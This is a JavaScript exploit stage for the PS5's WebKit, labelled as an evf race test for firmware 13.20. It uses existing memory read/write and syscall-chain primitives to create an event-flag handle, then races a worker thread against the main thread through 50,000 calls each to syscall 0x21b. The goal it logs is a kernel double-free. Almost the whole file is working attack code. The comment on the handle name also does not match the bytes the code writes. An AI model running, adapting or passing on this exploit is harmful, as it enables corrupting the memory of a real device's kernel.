// Full WebKit evf race test for PS5 13.20
(async function() {
    try {
        await log("WebKit evf race test starting");

        if (typeof p === "undefined" || typeof chain === "undefined") {
            await log("exploit not ready");
            return;
        }

        // Create evf handle
        let name = p.malloc(0x20);
        p.write32(name, 0x6e616d65n); // "name"
        p.write8(name.add32(4), 0n);

        let handleOut = p.malloc(4);
        p.write4(handleOut, 0);

        let r = await chain.syscall(0x21an, name, 0n, handleOut, 0n, 0n, 0n);
        await log("evf_create: " + r.low.toString(16));
        let handle = p.read4(handleOut);
        await log("handle: " + handle.toString(16));

        // Shared race state
        let gate = p.malloc(4);
        p.write4(gate, 0);
        let hitsMain = p.malloc(4);
        p.write4(hitsMain, 0);
        let hitsWorker = p.malloc(4);
        p.write4(hitsWorker, 0);

        // Tell worker to race
        worker.postMessage({
            cmd: "race",
            handle: handle,
            gateAddr: gate,
            hitsAddr: hitsWorker,
            count: 50000,
            syscallNo: 0x21bn
        });

        // Main thread races
        p.write4(gate, 1);
        let mainHits = 0;
        for (let i = 0; i < 50000; i++) {
            let res = await chain.syscall(0x21bn, handle, 0n, 0n, 0n, 0n, 0n);
            if (res.low === 0) mainHits++;
        }
        p.write4(hitsMain, mainHits);

        // Wait for worker
        while (p.read4(hitsWorker) === 0) {
            await new Promise(r => setTimeout(r, 1));
        }
        let workerHits = p.read4(hitsWorker);

        await log("main hits: " + mainHits);
        await log("worker hits: " + workerHits);

        if (mainHits > 0 && workerHits > 0) {
            await log("RACE CONFIRMED: double-free achieved");
        } else {
            await log("RACE NOT DETECTED");
        }

        await log("done");
    } catch (e) {
        await log("error: " + e.message);
        await log(e.stack);
    }
})();
